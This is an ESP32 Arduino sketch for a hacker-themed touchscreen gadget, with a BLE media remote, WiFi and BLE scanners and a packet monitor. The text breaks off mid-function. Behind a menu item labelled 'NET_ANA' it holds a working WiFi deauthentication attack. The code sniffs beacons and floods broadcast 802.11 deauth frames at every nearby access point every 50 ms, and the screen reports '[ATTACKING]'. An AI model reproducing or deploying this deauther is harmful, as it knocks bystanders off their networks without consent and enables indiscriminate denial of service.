#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ILI9341.h>
#include <XPT2046_Touchscreen.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEHIDDevice.h>
#include <BLE2904.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <WiFi.h> 
#include <esp_wifi.h> 

/* ================== PINS ================== */
#define TFT_CS   5
#define TFT_DC   2
#define TFT_RST  4
#define T_CS     15

/* ================== CONFIG ================== */
#define DEBOUNCE_DELAY   150 
#define C_BLACK      0x0000
#define C_DARK_BLUE  0x000F 
#define C_CYAN       0x07FF 
#define C_WHITE      0xFFFF 
#define C_RED        0xF800 
#define C_GREEN      0x07E0 

Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);
SPIClass touchSPI(HSPI);
XPT2046_Touchscreen ts(T_CS);

/* ================== GLOBAL VARIABLES ================== */
enum Page { PAGE_HOME, PAGE_MUSIC, PAGE_SETTINGS, PAGE_WIFI, PAGE_SYSTEM, PAGE_BLE, PAGE_PACKET, PAGE_NET_ANA };
Page currentPage = PAGE_HOME;

// PAGINATION STATE
int homePageIndex = 0; // 0 = First 6 apps, 1 = Next 6 apps

uint16_t THEME_MAIN = C_CYAN; 
int graphHistory[20]; 

// --- SCROLLING LIST SYSTEM ---
struct ListItem { String label; int value; };
#define MAX_LIST_ITEMS 40
ListItem scannedList[MAX_LIST_ITEMS];
int listCount = 0;
int scrollOffset = 0; 

// --- PACKET MONITOR STATE ---
unsigned long packetRate = 0;     
unsigned long lastPacketCheck = 0;
unsigned long totalPackets = 0;
int wifiChannel = 1;
int pktGraph[26]; 

// --- DEAUTHER STATE ---
bool isDeauthRunning = false;
unsigned long lastDeauthTime = 0;
unsigned long lastScanTime = 0;
int currentDeauthChannel = 1;
int deauthPacketCount = 0;

#define MAX_APS 20

struct AccessPoint {
    String essid;
    int8_t rssi;
    uint8_t bssid[6];
    int channel;
    bool found;
};

AccessPoint discoveredAPs[MAX_APS];
int apCount = 0; 

/* ================== BLE STATE ================== */
BLEHIDDevice* hid;
BLECharacteristic* inputMedia; 
BLEScan* pBLEScan; 
bool connected = false;
bool isPlaying = false;

// BLE Server Callback
class MyBLEServerCallbacks: public BLEServerCallbacks {
    void onConnect(BLEServer* pServer) {
        connected = true;
        Serial.println("[BLE] Device connected!");
    }
    
    void onDisconnect(BLEServer* pServer) {
        connected = false;
        Serial.println("[BLE] Device disconnected!");
        pServer->getAdvertising()->start();
    }
}; 

const uint8_t reportMap[] = {
    0x05, 0x0C,                    // USAGE_PAGE (Consumer Devices)
    0x09, 0x01,                    // USAGE (Consumer Control)
    0xA1, 0x01,                    // COLLECTION (Application)
    0x85, 0x01,                    // REPORT_ID (1)
    0x15, 0x01,                    // LOGICAL_MINIMUM (1)
    0x26, 0x8C, 0x02,              // LOGICAL_MAXIMUM (652)
    0x19, 0x01,                    // USAGE_MINIMUM (Consumer Control)
    0x2A, 0x8C, 0x02,              // USAGE_MAXIMUM (652)
    0x75, 0x10,                    // REPORT_SIZE (16) - 2 bytes for usage ID
    0x95, 0x01,                    // REPORT_COUNT (1)
    0x81, 0x00,                    // INPUT (Data,Ary,Abs)
    0xC0                           // END_COLLECTION
};

/* ================== HELPER FUNCTIONS ================== */
void wifi_promiscuous_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    packetRate++;
    totalPackets++;
}

void sendMediaKey(uint8_t keyMask) {
  if (!connected) {
    Serial.println("[BLE] Not connected, cannot send key");
    return;
  }
  
  // Consumer control usage codes
  uint16_t consumerCode = 0;
  if(keyMask == 1) consumerCode = 0xB6;      // Scan Previous Track
  else if(keyMask == 2) consumerCode = 0xB5; // Scan Next Track  
  else if(keyMask == 8) consumerCode = 0xCD; // Play/Pause
  
  Serial.print("[BLE] Sending media key: 0x");
  Serial.println(consumerCode, HEX);
  
  // Send consumer control code - report ID 1 + 16-bit usage code (little endian)
  uint8_t report[3] = {0x01, (uint8_t)(consumerCode & 0xFF), (uint8_t)((consumerCode >> 8) & 0xFF)};
  inputMedia->setValue(report, 3);
  inputMedia->notify();
  delay(100); 
  
  // Release (send 0x00)
  uint8_t releaseReport[3] = {0x01, 0x00, 0x00};
  inputMedia->setValue(releaseReport, 3);
  inputMedia->notify();
  delay(50);
}

String getUptime() {
  unsigned long ms = millis();
  int sec = (ms / 1000) % 60;
  int min = (ms / (1000 * 60)) % 60;
  int hr  = (ms / (1000 * 60 * 60)) % 24;
  char buffer[12];
  sprintf(buffer, "[%02d:%02d:%02d]", hr, min, sec);
  return String(buffer);
}

/* ================== UI DRAWING ================== */

void drawDedSecBackground() {
    tft.fillScreen(C_BLACK);
    for(int y=0; y<240; y+=4) tft.drawFastHLine(0, y, 320, C_DARK_BLUE);

    int len = 20;
    tft.drawFastHLine(0, 0, len, THEME_MAIN); tft.drawFastVLine(0, 0, len, THEME_MAIN);
    tft.drawFastHLine(320-len, 0, len, THEME_MAIN); tft.drawFastVLine(319, 0, len, THEME_MAIN);
    tft.drawFastHLine(0, 239, len, THEME_MAIN); tft.drawFastVLine(0, 240-len, len, THEME_MAIN);
    tft.drawFastHLine(320-len, 239, len, THEME_MAIN); tft.drawFastVLine(319, 240-len, len, THEME_MAIN);

    tft.fillRect(20, 5, 280, 18, C_BLACK); 
    tft.drawFastHLine(20, 23, 280, THEME_MAIN); 
    
    tft.setTextColor(THEME_MAIN); tft.setTextSize(1); tft.setCursor(25, 10);
    tft.print("ctOS_MOBILE // ");
    
    if(currentPage == PAGE_HOME) {
        tft.print("ROOT_ACCESS [PG "); tft.print(homePageIndex + 1); tft.print("]");
    }
    else if(currentPage == PAGE_MUSIC) tft.print("MODULE: A/V");
    else if(currentPage == PAGE_SETTINGS) tft.print("SYSTEM_CONFIG");
    else if(currentPage == PAGE_WIFI) tft.print("NET_SNIFFER");
    else if(currentPage == PAGE_SYSTEM) tft.print("HARDWARE_MON");
    else if(currentPage == PAGE_BLE) tft.print("BLE_TRACKER");
    else if(currentPage == PAGE_PACKET) tft.print("TRAFFIC_ANALYSIS");
    else if(currentPage == PAGE_NET_ANA) tft.print("DEAUTH_BROADCAST");

    tft.setCursor(250, 10);
    if(connected && currentPage != PAGE_PACKET) { tft.setTextColor(C_GREEN); tft.print("[LINK_OK]"); } 
    else { tft.setTextColor(C_RED); tft.print("[OFFLINE]"); }
}

void drawHackerBtn(int x, int y, int w, int h, const char* title, const char* sub) {
    tft.drawRect(x, y, w, h, THEME_MAIN);
    tft.drawFastHLine(x, y, 10, C_BLACK); tft.drawFastVLine(x, y, 10, C_BLACK);
    tft.drawLine(x, y+10, x+10, y, THEME_MAIN);
    tft.drawFastHLine(x+w-10, y+h-1, 10, C_BLACK); tft.drawFastVLine(x+w-1, y+h-10, 10, C_BLACK);
    tft.drawLine(x+w-10, y+h, x+w, y+h-10, THEME_MAIN);

    tft.setTextColor(C_WHITE); tft.setTextSize(2);
    tft.setCursor(x + 10, y + 20); tft.print(title);
    tft.setTextColor(THEME_MAIN); tft.setTextSize(1);
    tft.setCursor(x + 10, y + 45); tft.print(sub);
}

void drawBackButton() {
    tft.drawRect(0, 30, 45, 25, THEME_MAIN);
    tft.setCursor(5, 36); tft.setTextColor(THEME_MAIN); tft.setTextSize(1); tft.print("[RET]");
}

// === GENERIC LIST RENDERER ===
void drawListItems() {
    tft.fillRect(10, 70, 260, 130, C_BLACK);
    for (int i = 0; i < 5; i++) {
        int index = scrollOffset + i;
        if(index >= listCount) break;
        int y = 75 + (i * 25);
        tft.setCursor(25, y); tft.setTextSize(1); tft.setTextColor(C_WHITE);
        tft.print(scannedList[index].label);
        int rssi = scannedList[index].value;
        int barWidth = map(rssi, -100, -40, 5, 60);
        if(barWidth < 5) barWidth = 5; if(barWidth > 60) barWidth = 60;
        uint16_t barColor = (rssi > -70) ? C_GREEN : C_RED;
        tft.drawRect(200, y, 62, 10, THEME_MAIN); 
        tft.fillRect(201, y+1, barWidth, 8, barColor); 
        tft.setCursor(270, y); tft.setTextColor(THEME_MAIN); tft.print(rssi);
    }
    tft.drawRect(290, 70, 25, 60, THEME_MAIN); 
    tft.setCursor(297, 90); tft.setTextColor(C_WHITE); tft.setTextSize(2); tft.print("^");
    tft.drawRect(290, 140, 25, 60, THEME_MAIN); 
    tft.setCursor(297, 160); tft.print("v");
    tft.setCursor(285, 210); tft.setTextSize(1); tft.setTextColor(THEME_MAIN);
    tft.print(scrollOffset + 1); tft.print("/"); tft.print(listCount);
}

/* ================== PAGE: HOME ================== */
void drawHome() {
    drawDedSecBackground();
    tft.drawCircle(160, 120, 15, THEME_MAIN); tft.drawCircle(160, 120, 5, C_WHITE);
    tft.drawLine(160, 30, 160, 210, C_DARK_BLUE); 

    // === PAGINATION LOGIC ===
    if (homePageIndex == 0) {
        // PAGE 1 APPS
        drawHackerBtn(10, 50, 90, 70, "MEDIA", "A/V_MOD");
        drawHackerBtn(115, 50, 90, 70, "WIFI", "NET_SCN");
        drawHackerBtn(220, 50, 90, 70, "CONF", "SYS_SET");

        drawHackerBtn(10, 140, 90, 70, "SYSTEM", "HARDWARE");
        drawHackerBtn(115, 140, 90, 70, "BLE", "TRACKER");
        drawHackerBtn(220, 140, 90, 70, "PKT_MON", "TRAFFIC");
    } 
    else if (homePageIndex == 1) {
        // PAGE 2 APPS (Placeholders for now)
        drawHackerBtn(10, 50, 90, 70, "NET_ANA", "ANALYZER"); 
        // Add more apps here later...
    }

    // DRAW NAV ARROWS
    if (homePageIndex > 0) {
        tft.drawRect(10, 210, 50, 30, THEME_MAIN);
        tft.setCursor(25, 218); tft.setTextColor(C_WHITE); tft.print("<");
    }
    
    // Assuming max 2 pages (Index 0 and 1)
    if (homePageIndex < 1) {
        tft.drawRect(260, 210, 50, 30, THEME_MAIN);
        tft.setCursor(280, 218); tft.setTextColor(C_WHITE); tft.print(">");
    }
}

/* ================== PAGE: PACKET MONITOR ================== */
void startPacketMonitor() {
    BLEDevice::getAdvertising()->stop();
    WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
    for(int i=0; i<26; i++) pktGraph[i] = 0;
}

void stopPacketMonitor() {
    esp_wifi_set_promiscuous(false);
    BLEDevice::getAdvertising()->start();
}

/* ================== DEAUTHER FUNCTIONS ================== */

// Callback for sniffing beacons
void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t *rx_ctrl = &ppkt->rx_ctrl;
    
    if(type != WIFI_PKT_MGMT) return;
    
    uint8_t *frame = ppkt->payload;
    uint16_t len = rx_ctrl->sig_len;
    
    // Check for beacon frame (subtype 0x08, type 0)
    if((frame[0] & 0xFC) == 0x80) {
        uint8_t *bssid = frame + 10;
        
        // Extract SSID from frame (at offset 36+)
        int ssid_len = 0;
        uint8_t *ssid = nullptr;
        
        if(len > 36) {
            uint8_t *ptr = frame + 36;
            while((ptr - frame) < len - 2) {
                if(ptr[0] == 0) {  // SSID tag
                    ssid_len = ptr[1];
                    ssid = ptr + 2;
                    break;
                }
                ptr += ptr[1] + 2;
            }
        }
        
        int channel = rx_ctrl->channel;
        int8_t rssi = rx_ctrl->rssi;
        
        // Check if AP already exists
        for(int i = 0; i < apCount; i++) {
            if(memcmp(discoveredAPs[i].bssid, bssid, 6) == 0) {
                discoveredAPs[i].found = true;
                discoveredAPs[i].rssi = rssi;
                discoveredAPs[i].channel = channel;
                return;
            }
        }
        
        // Add new AP if we have space
        if(apCount < MAX_APS) {
            discoveredAPs[apCount].found = true;
            discoveredAPs[apCount].rssi = rssi;
            discoveredAPs[apCount].channel = channel;
            memcpy(discoveredAPs[apCount].bssid, bssid, 6);
            
            if(ssid && ssid_len > 0) {
                char ssid_str[33];
                memset(ssid_str, 0, 33);
                memcpy(ssid_str, ssid, (ssid_len < 32) ? ssid_len : 32);
                discoveredAPs[apCount].essid = String(ssid_str);
            } else {
                discoveredAPs[apCount].essid = "[Hidden]";
            }
            
            apCount++;
        }
    }
}

void sendDeauthPacket(uint8_t *bssid, uint8_t channel) {
    uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xC0, 0x00,                         // Frame control
        /*  2 - 3  */ 0x00, 0x00,                         // Duration
        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast)
        /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (will update)
        /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will update)
        /* 22 - 23 */ 0x00, 0x00,                         // Sequence
        /* 24 - 25 */ 0x01, 0x00                          // Reason code
    };
    
    // Set sender and BSSID to target AP
    memcpy(&deauthPacket[10], bssid, 6);
    memcpy(&deauthPacket[16], bssid, 6);
    
    // Set channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    delay(5);
    
    // Send packets
    for(int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
        delay(2);
    }
    deauthPacketCount += 10;
}

void startDeauther() {
    isDeauthRunning = true;
    apCount = 0;
    deauthPacketCount = 0;
    
    BLEDevice::getAdvertising()->stop();
    WiFi.disconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
    delay(100);
    
    // Initialize WiFi for packet injection
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
    
    lastScanTime = millis();
    lastDeauthTime = millis();
}

void stopDeauther() {
    isDeauthRunning = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_deinit();
    delay(100);
    
    BLEDevice::getAdvertising()->start();
}

void updateDeauther() {
    if(!isDeauthRunning) return;
    
    unsigned long now = millis();
    
    // Scan for APs every 2 seconds
    if(now - lastScanTime > 2000) {
        for(int i = 0; i < apCount; i++) {
            discoveredAPs[i].found = false;
        }
        lastScanTime = now;
        
        // Scan through all channels
        for(int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            delay(100);
        }
    }
    
    // Send deauth packets
    if(now - lastDeauthTime > 50) { // Send every 50ms
        for(int i = 0; i < apCount; i++) {
            sendDeauthPacket(discoveredAPs[i].bssid, discoveredAPs[i].channel);
        }
        lastDeauthTime = now;
    }
}

void drawPacketUI() {
    drawDedSecBackground();
    drawBackButton();
    
    tft.drawRect(20, 50, 60, 40, THEME_MAIN);
    tft.setCursor(35, 60); tft.setTextColor(C_WHITE); tft.setTextSize(2); tft.print("<");
    tft.drawRect(240, 50, 60, 40, THEME_MAIN);
    tft.setCursor(260, 60); tft.print(">");
    tft.drawRect(100, 50, 120, 40, C_DARK_BLUE);
    tft.setCursor(110, 60); tft.setTextColor(THEME_MAIN); tft.print("CH: "); tft.setTextColor(C_WHITE); tft.print(wifiChannel);
    
    tft.drawRect(20, 110, 280, 100, THEME_MAIN);
    tft.drawFastHLine(20, 160, 280, C_DARK_BLUE); 
    tft.drawFastVLine(160, 110, 100, C_DARK_BLUE);
    
    tft.setCursor(30, 220); tft.setTextSize(1); tft.setTextColor(THEME_MAIN);
    tft.print("TOTAL_PKTS: "); tft.setTextColor(C_WHITE); tft.print(totalPackets);
}

void updatePacketGraph() {
    if(millis() - lastPacketCheck > 250) {
        lastPacketCheck = millis();
        for(int i=0; i<25; i++) pktGraph[i] = pktGraph[i+1];
        int h = map(packetRate, 0, 50, 0, 90); if(h>90) h=90;
        pktGraph[25] = h;
        
        tft.fillRect(21, 111, 278, 98, C_BLACK); 
        for(int i=0; i<25; i++) {
             int x1 = 25 + (i * 10); int y1 = 208 - pktGraph[i];
             int x2 = 25 + ((i+1) * 10); int y2 = 208 - pktGraph[i+1];
             tft.drawLine(x1, y1, x2, y2, C_GREEN);
             tft.drawFastVLine(x1, y1, 208-y1, C_DARK_BLUE);
        }
        packetRate = 0;
    }
}

void changeChannel(int dir) {
    wifiChannel += dir;
    if(wifiChannel < 1) wifiChannel = 13;
    if(wifiChannel > 13) wifiChannel = 1;
    esp_wifi_set_channel(wifiChannel, WIFI_SECOND_CHAN_NONE);
    tft.fillRect(100, 50, 120, 40, C_BLACK);
    tft.drawRect(100, 50, 120, 40, C_DARK_BLUE);
    tft.setCursor(110, 60); tft.setTextColor(THEME_MAIN); tft.setTextSize(2); tft.print("CH: "); 
    tft.setTextColor(C_WHITE); tft.print(wifiChannel);
}

/* ================== PAGE: WIFI ================== */
void runWiFiScan() {
    tft.fillRect(90, 100, 160, 40, C_BLACK);
    tft.setCursor(100, 110); tft.setTextColor(C_WHITE); tft.setTextSize(2); tft.print("SCANNING...");
    WiFi.mode(WIFI_STA); WiFi.disconnect();
    int n = WiFi.scanNetworks();
    listCount = 0; scrollOffset = 0;
    if (n > 0) {
        if(n > MAX_LIST_ITEMS) n = MAX_LIST_ITEMS;
        for (int i = 0; i < n; ++i) {
            String ssid = WiFi.SSID(i);
            if(ssid.length() > 14) ssid = ssid.substring(0, 14);
            scannedList[i].label = ssid;
            scannedList[i].value = WiFi.RSSI(i);
            listCount++;
        }
    }
    drawListItems();
}

void drawWiFiPage() {
    drawDedSecBackground(); drawBackButton();
    tft.setTextColor(THEME_MAIN); tft.setTextSize(1);
    tft.setCursor(25, 50); tft.print("SSID // ACCESS_POINT"); tft.setCursor(200, 50); tft.print("SIGNAL");
    tft.drawFastHLine(20, 62, 280, THEME_MAIN);
    runWiFiScan();
    tft.drawRect(10, 205, 80, 30, THEME_MAIN);
    tft.setCursor(15, 212); tft.setTextSize(2); tft.setTextColor(C_WHITE); tft.print("SCAN");
}

/* ================== PAGE: BLE ================== */
void runBLEScan() {
    tft.fillRect(90, 100, 160, 40, C_BLACK);
    tft.setCursor(100, 110); tft.setTextColor(C_WHITE); tft.setTextSize(2); tft.print("SNIFFING...");
    BLEScanResults* foundDevices = pBLEScan->start(3, false);
    listCount = 0; scrollOffset = 0;
    int n = foundDevices->getCount();
    if (n > 0) {
        if(n > MAX_LIST_ITEMS) n = MAX_LIST_ITEMS;
        for(int i=0; i<n; i++) {
             BLEAdvertisedDevice device = foundDevices->getDevice(i);
             String name;
             if(device.haveName()) name = device.getName().c_str();
             else name = device.getAddress().toString().c_str();
             if(name.length() > 14) name = name.substring(0, 14);
             scannedList[i].label = name;
             scannedList[i].value = device.getRSSI();
             listCount++;
        }
    }
    pBLEScan->clearResults();
    drawListItems();
}

void drawBLEPage() {
    drawDedSecBackground(); drawBackButton();
    tft.setTextColor(THEME_MAIN); tft.setTextSize(1);
    tft.setCursor(25, 50); tft.print("DEVICE // ID"); tft.setCursor(200, 50); tft.print("SIGNAL");
    tft.drawFastHLine(20, 62, 280, THEME_MAIN);
    runBLEScan();
    tft.drawRect(10, 205, 80, 30, THEME_MAIN);
    tft.setCursor(15, 212); tft.setTextSize(2); tft.setTextColor(C_WHITE); tft.print("SCAN");
}

/* ================== PAGE: SYSTEM ================== */
void drawSystemStatic() {
    drawDedSecBackground(); drawBackButton();
    tft.setTextColor(C_WHITE); tft.setTextSize(1);
    int y = 50;
    tft.setCursor(20, y); tft.print("> HARDWARE_ID : ESP32_D0WDQ6"); y+=15;
    tft.setCursor(20, y); tft.print("> CPU_CORES   : 2 @ 240 MHz"); y+=15;
    tft.setCursor(20, y); tft.print("> MAC_ADDR    : "); tft.print(WiFi.macAddress()); y+=25;
    tft.drawRect(20, y, 280, 80, THEME_MAIN);
    tft.drawFastHLine(20, y+40, 280, C_DARK_BLUE); tft.drawFastVLine(160, y, 80, C_DARK_BLUE);    
    tft.setCursor(25, y-10); tft.setTextColor(THEME_MAIN); tft.print("LIVE_MEMORY_BUFFER // HEAP");
}

void updateSystemGraph() {
    for(int i=0; i<19; i++) graphHistory[i] = graphHistory[i+1];
    long freeHeap = ESP.getFreeHeap();
    int mappedVal = map(freeHeap, 100000, 300000, 75, 5); 
    graphHistory[19] = mappedVal; 
    tft.fillRect(21, 131, 278, 78, C_BLACK);
    tft.drawFastHLine(21, 170, 278, C_DARK_BLUE); tft.drawFastVLine(160, 131, 78, C_DARK_BLUE);
    for(int i=0; i<19; i++) {
        int x1 = 25 + (i * 14);     int y1 = 135 + graphHistory[i];
        int x2 = 25 + ((i+1) * 14); int y2 = 135 + graphHistory[i+1];
        tft.drawLine(x1, y1, x2, y2, C_GREEN);
    }
    tft.fillRect(20, 215, 200, 25, C_BLACK);
    tft.drawRect(20, 215, 200, 25, THEME_MAIN);
    tft.setCursor(30, 222); tft.setTextColor(THEME_MAIN); tft.print("UPTIME_CLOCK > ");
    tft.setTextColor(C_WHITE); tft.print(getUptime());
}

/* ================== PAGE: MUSIC ================== */
void drawMusicUI() {
    drawDedSecBackground(); drawBackButton();
    int cx = 160, cy = 130;
    tft.drawCircle(cx, cy, 50, THEME_MAIN); tft.drawCircle(cx, cy, 55, C_DARK_BLUE);
    for(int i=0; i<320; i+=10) { int h = random(5, 25); tft.drawFastVLine(i, 220-h, h*2, C_DARK_BLUE); }
    tft.drawFastHLine(0, 220, 320, THEME_MAIN);
    tft.drawCircle(cx, cy, 40, C_WHITE);
    if(isPlaying) { tft.fillRect(cx-12, cy-15, 8, 30, C_WHITE); tft.fillRect(cx+4, cy-15, 8, 30, C_WHITE); } 
    else { tft.fillTriangle(cx-8, cy-15, cx-8, cy+15, cx+18, cy, C_WHITE); }
    tft.drawRect(20, 100, 50, 60, THEME_MAIN); tft.setCursor(35, 120); tft.setTextColor(C_WHITE); tft.print("<");
    tft.setCursor(20, 165); tft.setTextColor(THEME_MAIN); tft.setTextSize(1); tft.print("[PREV]");
    tft.drawRect(250, 100, 50, 60, THEME_MAIN); tft.setCursor(265, 120); tft.setTextColor(C_WHITE); tft.setTextSize(2); tft.print(">");
    tft.setCursor(250, 165); tft.setTextColor(THEME_MAIN); tft.setTextSize(1); tft.print("[NEXT]");
}

void drawColorPicker() {
    tft.setCursor(20, 60); tft.setTextColor(C_WHITE); tft.setTextSize(2); tft.print("OVERRIDE THEME:");
    uint16_t colors[] = {0x07FF, 0x07E0, 0xF81F, 0xFD20}; 
    for(int i=0; i<4; i++) {
        tft.drawRect(20 + (i*75), 90, 60, 60, colors[i]); tft.fillRect(25 + (i*75), 95, 50, 50, colors[i]); 
        if(THEME_MAIN == colors[i]) {
            tft.drawRect(18 + (i*75), 88, 64, 64, C_WHITE); 
            tft.setCursor(25 + (i*75), 160); tft.setTextColor(C_WHITE); tft.setTextSize(1); tft.print("[ACTIVE]");
        }
    }
}
void drawSettings() { drawDedSecBackground(); drawBackButton(); drawColorPicker(); }

/* ================== PAGE: NET ANA (DEAUTHER) ================== */
void drawNetAnaUI() {
    drawDedSecBackground(); drawBackButton();
    
    // Title
    tft.setTextColor(THEME_MAIN); tft.setTextSize(1);
    tft.setCursor(25, 50); tft.print("DEAUTH_ATTACK // TARGET_APS");
    tft.drawFastHLine(20, 62, 280, THEME_MAIN);
    
    if(isDeauthRunning) {
        // Show discovered APs
        tft.fillRect(20, 70, 280, 110, C_BLACK);
        
        int displayCount = (apCount > 4) ? 4 : apCount;
        for(int i = 0; i < displayCount; i++) {
            int y = 75 + (i * 25);
            
            // ESSID
            tft.setCursor(25, y); tft.setTextColor(C_WHITE); tft.setTextSize(1);
            String essid = discoveredAPs[i].essid;
            if(essid.length() > 12) essid = essid.substring(0, 12);
            tft.print(essid);
            
            // Channel
            tft.setCursor(155, y); tft.setTextColor(THEME_MAIN);
            tft.print("CH:");
            tft.setTextColor(C_WHITE);
            tft.print(discoveredAPs[i].channel);
            
            // RSSI
            tft.setCursor(200, y); tft.setTextColor(THEME_MAIN);
            tft.print("PWR:");
            tft.setTextColor(C_WHITE);
            tft.print(discoveredAPs[i].rssi);
        }
        
        // Status
        tft.setCursor(25, 185); tft.setTextColor(C_GREEN); tft.setTextSize(1);
        tft.print("[ATTACKING] ");
        tft.setTextColor(C_WHITE);
        tft.print(apCount);
        tft.print(" targets | ");
        tft.print(deauthPacketCount);
        tft.print(" pkts");
    } else {
        // Idle state
        tft.drawRect(20, 80, 280, 80, THEME_MAIN);
        tft.drawFastHLine(20, 130, 280, C_DARK_BLUE);
        
        tft.setCursor(30, 95); tft.setTextSize(1); tft.setTextColor(C_GREEN);
        tft.print("[IDLE] READY TO SCAN");
        
        tft.setCursor(30, 115); tft.setTextColor(THEME_MAIN);
        tft.print("Press START to scan");
        tft.setCursor(30, 135); tft.print("for nearby WiFi APs");
    }
    
    // Control button
    tft.drawRect(30, 190, 120, 40, THEME_MAIN);
    tft.setCursor(45, 205); tft.setTextSize(2); tft.setTextColor(C_WHITE);
    tft.print(isDeauthRunning ? "STOP" : "START");
    
    // Info
    tft.setCursor(170, 195); tft.setTextSize(1); tft.setTextColor(THEME_MAIN);
    tft.print("Targets all WiFi");
    tft.setCursor(170, 210); tft.print("devices on their");
    tft.setCursor(170, 225); tft.print("designated channels");
}

/* ================== SETUP ================== */
void bootSequence() {
    tft.fillScreen(C_BLACK); tft.setTextSize(2); tft.setTextColor(C_WHITE);
    tft.setCursor(100, 40); tft.print(" /XXXX\\");
    tft.setCursor(100, 60); tft.print("|  XX  |");
    tft.setCursor(100, 80); tft.print("| [||] |");
    tft.setCursor(100,100); tft.print(" \\XXXX/");
    tft.setCursor(40, 140); tft.setTextColor(THEME_MAIN); tft.print("DedSec // ctOS");
    tft.setTextSize(1); tft.setCursor(10, 180); tft.setTextColor(C_WHITE); tft.print("> INJECTING PAYLOAD...");
    tft.drawRect(40, 200, 240, 15, THEME_MAIN);
    for(int i=0; i<236; i+=10) { 
        tft.fillRect(42, 202, i, 11, C_WHITE); 
        int noiseX = random(0, 320); int noiseY = random(0, 240); tft.drawPixel(noiseX, noiseY, C_WHITE);
        delay(30); 
    }
}

void setup() {
  Serial.begin(115200);
  tft.begin(); tft.setRotation(3); 
  bootSequence(); 
  touchSPI.begin(14, 12, 13, T_CS); ts.begin(touchSPI); ts.setRotation(3); 
  
  BLEDevice::init("ESP32_CYBERDECK");
  BLEServer* pServer = BLEDevice::createServer();
  pServer->setCallbacks(new MyBLEServerCallbacks());
  hid = new BLEHIDDevice(pServer);
  inputMedia = hid->inputReport(1);  // Match report ID 1 in reportMap
  hid->manufacturer()->setValue("ESP32");
  hid->pnp(0x02, 0xe502, 0xa111, 0x0210);
  hid->hidInfo(0x00, 0x01);
  hid->reportMap((uint8_t*)reportMap, sizeof(reportMap));
  hid->startServices();
  
  // Configure BLE advertising with HID service
  BLEAdvertising *pAdvertising = pServer->getAdvertising();
  pAdvertising->setAppearance(HID_KEYBOARD);
  pAdvertising->addServiceUUID(hid->hidService()->getUUID());
  pAdvertising->start();
  
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  drawHome();
}

/* ================== LOOP ================== */
unsigned long lastDebounce = 0;
unsigned long lastGraphUpdate = 0;

void loop() {
  if(currentPage == PAGE_SYSTEM && millis() - lastGraphUpdate > 500) {
      updateSystemGraph();
      lastGraphUpdate = millis();
  }
  
  if(currentPage == PAGE_PACKET) {
      updatePacketGraph();
  }
  
  if(currentPage == PAGE_NET_ANA) {
      updateDeauther();
  }

  if (ts.touched()) {
    TS_Point p = ts.getPoint();
    if (p.z > 200 && (millis() - lastDebounce > DEBOUNCE_DELAY)) {
        int x = map(p.x, 3700, 200, 0, 320); 
        int y = map(p.y, 3700, 200, 0, 240);
        
        // BACK BUTTON
        if(currentPage != PAGE_HOME && x < 50 && y > 25 && y < 60) {
            if(currentPage == PAGE_PACKET) stopPacketMonitor();
            if(currentPage == PAGE_NET_ANA) stopDeauther();
            currentPage = PAGE_HOME; drawHome(); lastDebounce = millis(); return;
        }

        // HOME PAGE CLICKS
        if(currentPage == PAGE_HOME) {
            if (homePageIndex == 0) {
                // PAGE 1
                if(x > 10 && x < 100 && y > 50 && y < 120) { currentPage = PAGE_MUSIC; drawMusicUI(); }
                else if(x > 115 && x < 205 && y > 50 && y < 120) { currentPage = PAGE_WIFI; drawWiFiPage(); }
                else if(x > 220 && x < 310 && y > 50 && y < 120) { currentPage = PAGE_SETTINGS; drawSettings(); }
                else if(x > 10 && x < 100 && y > 140 && y < 210) { currentPage = PAGE_SYSTEM; drawSystemStatic(); }
                else if(x > 115 && x < 205 && y > 140 && y < 210) { currentPage = PAGE_BLE; drawBLEPage(); }
                else if(x > 220 && x < 310 && y > 140 && y < 210) { currentPage = PAGE_PACKET; startPacketMonitor(); drawPacketUI(); }
            }
            else if (homePageIndex == 1) {
                // PAGE 2 (App 7 goes here, currently using same bounds as app 1)
                if(x > 10 && x < 100 && y > 50 && y < 120) {
                    currentPage = PAGE_NET_ANA; startDeauther(); drawNetAnaUI();
                }
            }

            // PAGINATION TOUCH ZONES
            if(y > 200) {
                if(x < 60 && homePageIndex > 0) { homePageIndex--; drawHome(); }
                else if(x > 260 && homePageIndex < 1) { homePageIndex++; drawHome(); }
            }
        }

        // MUSIC PAGE
        else if(currentPage == PAGE_MUSIC) {
            if(abs(x-160) < 50 && abs(y-130) < 50) { isPlaying = !isPlaying; drawMusicUI(); sendMediaKey(8); }
            else if(x > 250 && y > 100 && y < 160) sendMediaKey(1);
            else if(x < 70 && y > 100 && y < 160) sendMediaKey(2);
        }

        // SETTINGS PAGE
        else if(currentPage == PAGE_SETTINGS) {
            if(y > 90 && y < 150) {
